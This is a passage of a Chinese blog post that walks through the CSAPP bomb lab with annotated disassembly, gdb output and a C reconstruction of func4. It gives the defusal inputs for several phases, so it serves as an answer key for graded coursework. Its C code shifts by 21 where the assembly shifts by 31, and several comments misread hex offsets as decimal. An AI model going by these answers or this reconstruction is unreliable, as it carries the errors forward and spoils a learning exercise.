class="line">&#x2F;&#x2F;rdi *input</span><br><span class="line">    0x0000000000400efc &lt;+0&gt;:push   %rbp</span><br><span class="line">    0x0000000000400efd &lt;+1&gt;:push   %rbx&#x2F;&#x2F;保存环境</span><br><span class="line">    0x0000000000400efe &lt;+2&gt;:sub    $0x28,%rsp   &#x2F;&#x2F;栈分28位</span><br><span class="line">    0x0000000000400f02 &lt;+6&gt;:mov    %rsp,%rsi    &#x2F;&#x2F;栈指针作为第二个参数</span><br><span class="line">    0x0000000000400f05 &lt;+9&gt;:callq  0x40145c &lt;read_six_numbers&gt;&#x2F;&#x2F;读数在栈内</span><br><span class="line">    0x0000000000400f0a &lt;+14&gt;:cmpl   $0x1,(%rsp)  &#x2F;&#x2F;栈顶元素与1比较</span><br><span class="line">    0x0000000000400f0e &lt;+18&gt;:je     0x400f30 &lt;phase_2+52&gt;    &#x2F;&#x2F;不同炸, 相同转52</span><br><span class="line">    0x0000000000400f10 &lt;+20&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x0000000000400f15 &lt;+25&gt;:jmp    0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">    0x0000000000400f17 &lt;+27&gt;:mov    -0x4(%rbx),%eax      &#x2F;&#x2F;eax &#x3D; 栈元素前一个元素</span><br><span class="line">    0x0000000000400f1a &lt;+30&gt;:add    %eax,%eax            &#x2F;&#x2F;eax *&#x3D; 2</span><br><span class="line">    0x0000000000400f1c &lt;+32&gt;:cmp    %eax,(%rbx)              &#x2F;&#x2F;rbx(下一个元素)与eax(两倍的上一个元素)比较</span><br><span class="line">    0x0000000000400f1e &lt;+34&gt;:je     0x400f25 &lt;phase_2+41&gt;    &#x2F;&#x2F;不同炸,相同转41</span><br><span class="line">    0x0000000000400f20 &lt;+36&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x0000000000400f25 &lt;+41&gt;:add    $0x4,%rbx            &#x2F;&#x2F;rbx &#x3D; 栈下一个元素</span><br><span class="line">    0x0000000000400f29 &lt;+45&gt;:cmp    %rbp,%rbx            &#x2F;&#x2F;rbx 与 rbp比较</span><br><span class="line">    0x0000000000400f2c &lt;+48&gt;:jne    0x400f17 &lt;phase_2+27&gt;    &#x2F;&#x2F;不同转27,继续轮回</span><br><span class="line">    0x0000000000400f2e &lt;+50&gt;:jmp    0x400f3c &lt;phase_2+64&gt;&#x2F;&#x2F;相同,第六个元素 转64</span><br><span class="line">    0x0000000000400f30 &lt;+52&gt;:lea    0x4(%rsp),%rbx       &#x2F;&#x2F;rbx &#x3D; 下一个元素</span><br><span class="line">    0x0000000000400f35 &lt;+57&gt;:lea    0x18(%rsp),%rbp      &#x2F;&#x2F;rbp &#x3D; 栈顶+18(应该是第六个元素,存疑)</span><br><span class="line">    0x0000000000400f3a &lt;+62&gt;:jmp    0x400f17 &lt;phase_2+27&gt;   &#x2F;&#x2F;转27</span><br><span class="line">    0x0000000000400f3c &lt;+64&gt;:add    $0x28,%rsp           &#x2F;&#x2F;出栈28位</span><br><span class="line">    0x0000000000400f40 &lt;+68&gt;:pop    %rbx</span><br><span class="line">    0x0000000000400f41 &lt;+69&gt;:pop    %rbp             &#x2F;&#x2F;恢复环境</span><br><span class="line">    0x0000000000400f42 &lt;+70&gt;:retq                    &#x2F;&#x2F;结束</span><br></pre></td></tr></table></figure><p>注: </p><ol><li>read_six_numbers 函数内其实没看懂, 由名字猜测了一波</li><li>lea S D指令, 将S(一个有效地址) 复制给D, 后续引用(D)用法类似指针</li><li><code>add    $0x4,%rbx</code> 指针下一个元素, 注意栈是倒过来储存的</li><li>存疑:<ol><li>57 行, <code>%rbp</code>应该是被赋了第六个参数的值. 可是为什么是+18? 不应该是+ 20(4*5)吗?</li></ol></li></ol><h3 id="read-six-numbers"><a href="#read-six-numbers" class="headerlink" title="read_six_numbers"></a>read_six_numbers</h3><ul><li>输入: *input, 栈指针</li><li>功能: 读取6个数据写在内存中</li><li>调用: __isoc99_sscanf@plt (疑似库函数?)</li><li>返回: 无</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function read_six_numbers:</span><br><span class="line">    0x000000000040145c &lt;+0&gt;:sub    $0x18,%rsp       &#x2F;&#x2F;分配18</span><br><span class="line">    0x0000000000401460 &lt;+4&gt;:mov    %rsi,%rdx        &#x2F;&#x2F;rdx &#x3D; 原栈指针</span><br><span class="line">    0x0000000000401463 &lt;+7&gt;:lea    0x4(%rsi),%rcx   &#x2F;&#x2F;rcx &#x3D; (栈4)</span><br><span class="line">    0x0000000000401467 &lt;+11&gt;:lea    0x14(%rsi),%rax  &#x2F;&#x2F;rax &#x3D; (栈20)</span><br><span class="line">    0x000000000040146b &lt;+15&gt;:mov    %rax,0x8(%rsp)   &#x2F;&#x2F;(栈+8) &#x3D; 栈20</span><br><span class="line">    0x0000000000401470 &lt;+20&gt;:lea    0x10(%rsi),%rax  &#x2F;&#x2F;rax &#x3D; (栈+16)</span><br><span class="line">    0x0000000000401474 &lt;+24&gt;:mov    %rax,(%rsp)      &#x2F;&#x2F;(rsp) &#x3D; rax &#x3D; (原栈+16)</span><br><span class="line">    0x0000000000401478 &lt;+28&gt;:lea    0xc(%rsi),%r9    &#x2F;&#x2F;r9 &#x3D; (rsi+12)</span><br><span class="line">    0x000000000040147c &lt;+32&gt;:lea    0x8(%rsi),%r8    &#x2F;&#x2F;r8 &#x3D; (rsi+8)</span><br><span class="line">    0x0000000000401480 &lt;+36&gt;:mov    $0x4025c3,%esi   &#x2F;&#x2F;si &#x3D; $0x4025c3</span><br><span class="line">    0x0000000000401485 &lt;+41&gt;:mov    $0x0,%eax        &#x2F;&#x2F;ax &#x3D; 0</span><br><span class="line">    0x000000000040148a &lt;+46&gt;:callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">    0x000000000040148f &lt;+51&gt;:cmp    $0x5,%eax        &#x2F;&#x2F;结果与5比较</span><br><span class="line">    0x0000000000401492 &lt;+54&gt;:jg     0x401499 &lt;read_six_numbers+61&gt;&#x2F;&#x2F;结果&gt;5 不炸</span><br><span class="line">    0x0000000000401494 &lt;+56&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x0000000000401499 &lt;+61&gt;:add    $0x18,%rsp       &#x2F;&#x2F;收回18</span><br><span class="line">    0x000000000040149d &lt;+65&gt;:retq</span><br></pre></td></tr></table></figure><p>嗯…虽然我没懂他每一步在干什么, 不妨碍我猜出他是用来干啥的.</p><h3 id="Phase-3"><a href="#Phase-3" class="headerlink" title="Phase_3"></a>Phase_3</h3><ul><li>输入: *input</li><li>功能: 与两个数字比较, 不同炸</li><li>调用: __isoc99_sscanf</li><li>返回: 无</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">rdi &#x3D; &amp;input</span><br><span class="line">Dump of assembler code for function phase_3:</span><br><span class="line">    0x0000000000400f43 &lt;+0&gt;:    sub    $0x18,%rsp               &#x2F;&#x2F;栈扩18</span><br><span class="line">    0x0000000000400f47 &lt;+4&gt;:    lea    0xc(%rsp),%rcx           &#x2F;&#x2F;rcx &#x3D; &amp;(栈12)</span><br><span class="line">    0x0000000000400f4c &lt;+9&gt;:    lea    0x8(%rsp),%rdx           &#x2F;&#x2F;rdx &#x3D; &amp;(栈8)</span><br><span class="line">    0x0000000000400f51 &lt;+14&gt;:mov    $0x4025cf,%esi           &#x2F;&#x2F;si &#x3D; $0x4025cf</span><br><span class="line">    0x0000000000400f56 &lt;+19&gt;:mov    $0x0,%eax                &#x2F;&#x2F;ax &#x3D; $0x0</span><br><span class="line">    0x0000000000400f5b &lt;+24&gt;:callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;   &#x2F;&#x2F; 见注解p3_1,将2个数字装入栈8 和 栈12处</span><br><span class="line">    0x0000000000400f60 &lt;+29&gt;:cmp    $0x1,%eax                &#x2F;&#x2F;ax与1比较 </span><br><span class="line">    0x0000000000400f63 &lt;+32&gt;:jg     0x400f6a &lt;phase_3+39&gt;    &#x2F;&#x2F;ax&gt;1 跳转39 否则炸</span><br><span class="line">    0x0000000000400f65 &lt;+34&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x0000000000400f6a &lt;+39&gt;:cmpl   $0x7,0x8(%rsp)           &#x2F;&#x2F;*(栈8)与7比较 (也就是数字1与7比较)</span><br><span class="line">    0x0000000000400f6f &lt;+44&gt;:ja     0x400fad &lt;phase_3+106&gt;   &#x2F;&#x2F;*(栈8)&gt;7(无符号) 转106,炸</span><br><span class="line">    0x0000000000400f71 &lt;+46&gt;:mov    0x8(%rsp),%eax           &#x2F;&#x2F;ax &#x3D; *(栈8) 数1</span><br><span class="line">    0x0000000000400f75 &lt;+50&gt;:jmpq   *0x402470(,%rax,8)       &#x2F;&#x2F;跳转到(ax*8+0x402470) 见注解p3_2</span><br><span class="line">    0x0000000000400f7c &lt;+57&gt;:mov    $0xcf,%eax               &#x2F;&#x2F;上接50 且ax&#x3D;0 key &#x3D; 0xcf &#x3D; 207</span><br><span class="line">    0x0000000000400f81 &lt;+62&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400f83 &lt;+64&gt;:mov    $0x2c3,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;2 key &#x3D; 0x2c3 &#x3D; 707</span><br><span class="line">    0x0000000000400f88 &lt;+69&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400f8a &lt;+71&gt;:mov    $0x100,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;3 key &#x3D; 0x100 &#x3D; 256</span><br><span class="line">    0x0000000000400f8f &lt;+76&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400f91 &lt;+78&gt;:mov    $0x185,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;4 key &#x3D; 0x185 &#x3D; 389</span><br><span class="line">    0x0000000000400f96 &lt;+83&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400f98 &lt;+85&gt;:mov    $0xce,%eax               &#x2F;&#x2F;上接50 且ax&#x3D;5 key &#x3D; 0xce  &#x3D; 206</span><br><span class="line">    0x0000000000400f9d &lt;+90&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400f9f &lt;+92&gt;:mov    $0x2aa,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;6 key &#x3D; 0x2aa &#x3D; 682</span><br><span class="line">    0x0000000000400fa4 &lt;+97&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400fa6 &lt;+99&gt;:mov    $0x147,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;7 key &#x3D; 0x147 &#x3D; 327</span><br><span class="line">    0x0000000000400fab &lt;+104&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400fad &lt;+106&gt;:callq  0x40143a &lt;explode_bomb&gt;  &#x2F;&#x2F;上接44,输入个数&lt;2</span><br><span class="line">    0x0000000000400fb2 &lt;+111&gt;:mov    $0x0,%eax                &#x2F;&#x2F;这里是什么情况?存疑</span><br><span class="line">    0x0000000000400fb7 &lt;+116&gt;:jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">    0x0000000000400fb9 &lt;+118&gt;:mov    $0x137,%eax              &#x2F;&#x2F;上接50 且ax&#x3D;1 key &#x3D; 0x137 &#x3D; 311</span><br><span class="line">    0x0000000000400fbe &lt;+123&gt;:cmp    0xc(%rsp),%eax           &#x2F;&#x2F;比较ax(即key)与数2</span><br><span class="line">    0x0000000000400fc2 &lt;+127&gt;:je     0x400fc9 &lt;phase_3+134&gt;   &#x2F;&#x2F;不等炸</span><br><span class="line">    0x0000000000400fc4 &lt;+129&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x0000000000400fc9 &lt;+134&gt;:add    $0x18,%rsp</span><br><span class="line">    0x0000000000400fcd &lt;+138&gt;:retq</span><br></pre></td></tr></table></figure><p>注: </p><ol><li><p>输入两个数字,分别储存在栈8与栈12处, 多余输入不计</p></li><li><p>如果输入1个,直接炸</p></li><li><p>数1(栈8) 若&gt;(unsigned )7, 直接炸</p></li><li><p>根据数1的不同取值(0~7), 跳转到栈种储存的不同地址, 并根据地址拿到key(存储到ax中)</p></li><li><p>数2(栈12) 与 key比较, 不同炸, 相同过</p></li><li><p>疑惑:</p><p>+111处是什么时候会运行到? 直接把ax赋0?</p></li></ol><h4 id="注解p3-1"><a href="#注解p3-1" class="headerlink" title="注解p3_1"></a>注解p3_1</h4><p><strong>__isoc99_sscanf()</strong></p><p>​    c99标准库sscanf函数, <a href="http://www.cplusplus.com/reference/cstdio/sscanf/" target="_blank" rel="noopener">参考链接</a></p><blockquote><p>​    int sscanf ( const char <em> s, const char </em> format, …);</p><p>​    Read formatted data from string</p><p>​    Reads data from s and stores them according to parameter format into the locations given by the additional arguments, as if scanf was used, but reading from s instead of the standard input (stdin).</p><p>​    The additional arguments should point to already allocated objects of the type specified by their corresponding format specifier within the format string.</p><p>​    Return Value</p><p>​    On success, the function returns the number of items in the argument list successfully filled. This count can match the expected number of items or be less (even zero) in the case of a matching failure.</p><p>​    In the case of an input failure before any data could be successfully interpreted, EOF is returned. </p></blockquote><p>​    返回读取到的item的个数</p><h4 id="注解p3-2"><a href="#注解p3-2" class="headerlink" title="注解p3_2"></a>注解p3_2</h4><p><strong>每个(ax*8+0x402470)中储存的地址</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(gdb) print *(int**)  (0x402470+8*0)</span><br><span class="line">$11 &#x3D; (int *) 0x400f7c &lt;phase_3+57&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*1)</span><br><span class="line">$12 &#x3D; (int *) 0x400fb9 &lt;phase_3+118&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*2)</span><br><span class="line">$13 &#x3D; (int *) 0x400f83 &lt;phase_3+64&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*3)</span><br><span class="line">$14 &#x3D; (int *) 0x400f8a &lt;phase_3+71&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*4)</span><br><span class="line">$15 &#x3D; (int *) 0x400f91 &lt;phase_3+78&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*5)</span><br><span class="line">$16 &#x3D; (int *) 0x400f98 &lt;phase_3+85&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*6)</span><br><span class="line">$17 &#x3D; (int *) 0x400f9f &lt;phase_3+92&gt;</span><br><span class="line"></span><br><span class="line">(gdb) print *(int**)  (0x402470+8*7)</span><br><span class="line">$18 &#x3D; (int *) 0x400fa6 &lt;phase_3+99&gt;</span><br></pre></td></tr></table></figure><h3 id="Phase-4"><a href="#Phase-4" class="headerlink" title="Phase_4"></a>Phase_4</h3><ul><li>输入: *input</li><li>功能: 与两个数字比较, 相同则炸弹拆除</li><li>调用: __isoc99_sscanf</li><li>返回: 无</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">%rdi &amp;input</span><br><span class="line">Dump of assembler code for function phase_4:</span><br><span class="line">    0x000000000040100c &lt;+0&gt;:sub    $0x18,%rsp               &#x2F;&#x2F;扩栈18</span><br><span class="line">    0x0000000000401010 &lt;+4&gt;:lea    0xc(%rsp),%rcx           &#x2F;&#x2F;cx 栈12   数2</span><br><span class="line">    0x0000000000401015 &lt;+9&gt;:lea    0x8(%rsp),%rdx           &#x2F;&#x2F;dx 栈8    数1</span><br><span class="line">    0x000000000040101a &lt;+14&gt;:mov    $0x4025cf,%esi           &#x2F;&#x2F;si &#x3D; 0x4025cf</span><br><span class="line">    0x000000000040101f &lt;+19&gt;:mov    $0x0,%eax                &#x2F;&#x2F;ax &#x3D; 0</span><br><span class="line">    0x0000000000401024 &lt;+24&gt;:callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;   &#x2F;&#x2F;读取</span><br><span class="line">    0x0000000000401029 &lt;+29&gt;:cmp    $0x2,%eax                &#x2F;&#x2F;读入2个数字</span><br><span class="line">    0x000000000040102c &lt;+32&gt;:jne    0x401035 &lt;phase_4+41&gt;    &#x2F;&#x2F;读入个数!&#x3D;2,炸</span><br><span class="line">    0x000000000040102e &lt;+34&gt;:cmpl   $0xe,0x8(%rsp)           &#x2F;&#x2F;数1 与 14比较</span><br><span class="line">    0x0000000000401033 &lt;+39&gt;:jbe    0x40103a &lt;phase_4+46&gt;    &#x2F;&#x2F;数1 &lt;&#x3D;14 转46</span><br><span class="line">    0x0000000000401035 &lt;+41&gt;:callq  0x40143a &lt;explode_bomb&gt;  &#x2F;&#x2F;数1 &gt;14 炸</span><br><span class="line">    0x000000000040103a &lt;+46&gt;:mov    $0xe,%edx                &#x2F;&#x2F;14赋给dx</span><br><span class="line">    0x000000000040103f &lt;+51&gt;:mov    $0x0,%esi                &#x2F;&#x2F;si &#x3D; 0</span><br><span class="line">    0x0000000000401044 &lt;+56&gt;:mov    0x8(%rsp),%edi           &#x2F;&#x2F;di 栈8    数1</span><br><span class="line">    0x0000000000401048 &lt;+60&gt;:callq  0x400fce &lt;func4&gt;         </span><br><span class="line">    0x000000000040104d &lt;+65&gt;:test   %eax,%eax                &#x2F;&#x2F;对于返回值ax</span><br><span class="line">    0x000000000040104f &lt;+67&gt;:jne    0x401058 &lt;phase_4+76&gt;    &#x2F;&#x2F;ax!&#x3D;0 转76 炸</span><br><span class="line">    0x0000000000401051 &lt;+69&gt;:cmpl   $0x0,0xc(%rsp)           &#x2F;&#x2F;栈12(数2) &#x3D;&#x3D; 0</span><br><span class="line">    0x0000000000401056 &lt;+74&gt;:je     0x40105d &lt;phase_4+81&gt;    &#x2F;&#x2F;不等炸,等拆</span><br><span class="line">    0x0000000000401058 &lt;+76&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">    0x000000000040105d &lt;+81&gt;:add    $0x18,%rsp</span><br><span class="line">    0x0000000000401061 &lt;+85&gt;:retq</span><br></pre></td></tr></table></figure><p>注:</p><ol><li>这一块代码还是比较好懂的. 0~32从input中取两个数字放入栈8 栈12 处, 如果不是<strong>两个</strong>数字的话直接炸</li><li>34~67 是对数1 检测, 首先数1必须&lt;=14, 否则炸. 然后对数1调用func4函数, 如果返回值!=0直接炸</li><li>69~85 是对数2 检测, 简单的令人发指. 不为0炸, 为0炸弹拆除.</li></ol><h3 id="func4"><a href="#func4" class="headerlink" title="func4"></a>func4</h3><ul><li>输入: rdi = 数1 rsi = ?   rdx = 0xe</li><li>功能: 对参数进行某种神秘操作, 返回某个值</li><li>调用:  func4</li><li>返回: 某个int</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">第一轮: rdi &#x3D; 数1 rsi &#x3D; 0   rdx &#x3D; 0xe </span><br><span class="line">Dump of assembler code for function func4:</span><br><span class="line">   0x0000000000400fce &lt;+0&gt;:    sub    $0x8,%rsp            &#x2F;&#x2F;栈扩8</span><br><span class="line">   0x0000000000400fd2 &lt;+4&gt;:    mov    %edx,%eax            &#x2F;&#x2F;ax &#x3D; dx</span><br><span class="line">   0x0000000000400fd4 &lt;+6&gt;:    sub    %esi,%eax            &#x2F;&#x2F;ax &#x3D; dx-si</span><br><span class="line">   0x0000000000400fd6 &lt;+8&gt;:    mov    %eax,%ecx            &#x2F;&#x2F;cx &#x3D; dx-si</span><br><span class="line">   0x0000000000400fd8 &lt;+10&gt;:shr    $0x1f,%ecx           &#x2F;&#x2F;逻辑右移 cx 31位 正0负1</span><br><span class="line">   0x0000000000400fdb &lt;+13&gt;:add    %ecx,%eax            &#x2F;&#x2F;ax +&#x3D; cx</span><br><span class="line">   0x0000000000400fdd &lt;+15&gt;:sar    %eax                 &#x2F;&#x2F;ax 算数右移1位</span><br><span class="line">   0x0000000000400fdf &lt;+17&gt;:lea    (%rax,%rsi,1),%ecx   &#x2F;&#x2F;cx &#x3D; si + ax</span><br><span class="line">   0x0000000000400fe2 &lt;+20&gt;:cmp    %edi,%ecx            &#x2F;&#x2F;cx与数1比较 </span><br><span class="line">   0x0000000000400fe4 &lt;+22&gt;:jle    0x400ff2 &lt;func4+36&gt;  &#x2F;&#x2F;cx&lt;&#x3D;数1, 转36</span><br><span class="line">   0x0000000000400fe6 &lt;+24&gt;:lea    -0x1(%rcx),%edx      &#x2F;&#x2F;cx&gt;数1 dx &#x3D; cx-1</span><br><span class="line">   0x0000000000400fe9 &lt;+27&gt;:callq  0x400fce &lt;func4&gt;     &#x2F;&#x2F;调用func4 di&#x3D;数1,si&#x3D;si,dx&#x3D;cx-1</span><br><span class="line">   0x0000000000400fee &lt;+32&gt;:add    %eax,%eax            &#x2F;&#x2F;返回值ax*&#x3D;2</span><br><span class="line">   0x0000000000400ff0 &lt;+34&gt;:jmp    0x401007 &lt;func4+57&gt;  &#x2F;&#x2F;返回</span><br><span class="line">   0x0000000000400ff2 &lt;+36&gt;:mov    $0x0,%eax            &#x2F;&#x2F;上接22 ax &#x3D; 0</span><br><span class="line">   0x0000000000400ff7 &lt;+41&gt;:cmp    %edi,%ecx            &#x2F;&#x2F;比较cx 数1</span><br><span class="line">   0x0000000000400ff9 &lt;+43&gt;:jge    0x401007 &lt;func4+57&gt;  &#x2F;&#x2F;cx&gt;&#x3D;数1(也就是cx&#x3D;数1) 转57 返回 </span><br><span class="line">   0x0000000000400ffb &lt;+45&gt;:lea    0x1(%rcx),%esi       &#x2F;&#x2F;cx&lt;数1 si &#x3D; cx+1</span><br><span class="line">   0x0000000000400ffe &lt;+48&gt;:callq  0x400fce &lt;func4&gt;     &#x2F;&#x2F;调用func4 di&#x3D;数1,si&#x3D;si&#x3D;cx+1,dx&#x3D;dx</span><br><span class="line">   0x0000000000401003 &lt;+53&gt;:lea    0x1(%rax,%rax,1),%eax    &#x2F;&#x2F;ax&#x3D;2ax+1</span><br><span class="line">   0x0000000000401007 &lt;+57&gt;:add    $0x8,%rsp            </span><br><span class="line">   0x000000000040100b &lt;+61&gt;:retq</span><br></pre></td></tr></table></figure><p>这个函数折磨了我整整24h, 最终没忍住去搜了别人的题解. 下面这一段借鉴了<a href="https://www.jianshu.com/p/33eb51b2024e" target="_blank" rel="noopener">一位简书网友的这篇文章</a></p><p>对func4函数进行反汇编:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fun4</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> v2, <span class="keyword">int</span> v3)</span></span>&#123;</span><br><span class="line">    <span class="comment">/*  x = rdi(数1) </span></span><br><span class="line"><span class="comment">        v2 = rsi(初值0)</span></span><br><span class="line"><span class="comment">        v3 = rdx(初值e)*/</span></span><br><span class="line">    <span class="keyword">int</span> tmp = (v3 - v2) &gt;&gt; <span class="number">21</span>;    <span class="comment">//逻辑右移</span></span><br><span class="line">    <span class="keyword">int</span> re = ((v3 - v2) + tmp) &gt;&gt; <span class="number">1</span>; <span class="comment">//算数右移</span></span><br><span class="line">    tmp = v2 + re;</span><br><span class="line">    <span class="keyword">if</span>(tmp &lt;= x) &#123;</span><br><span class="line">        <span class="keyword">if</span>(tmp&gt;=x) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        re = fun4(x,tmp+<span class="number">1</span>,v3);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>*re+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        re = fun4(x,v2,tmp<span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * re;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不妨再写个测试函数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">0xe</span> ; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(fun4(i, <span class="number">0x0</span>, <span class="number">0xe</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">3</span><br><span class="line">7</span><br></pre></td></tr></table></figure><p>当且仅当 x = 0,1,3,7 中某个值时,func会返回0.</p><h3 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h3><ul><li>输入: *input</li><li>功能: 根据 input 指向对象映射得出新字符串, 若新字符串与<code>flyers</code>相同则炸弹拆除</li><li>调用: strings_not_equal(); string_length</li><li>返回: 0</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 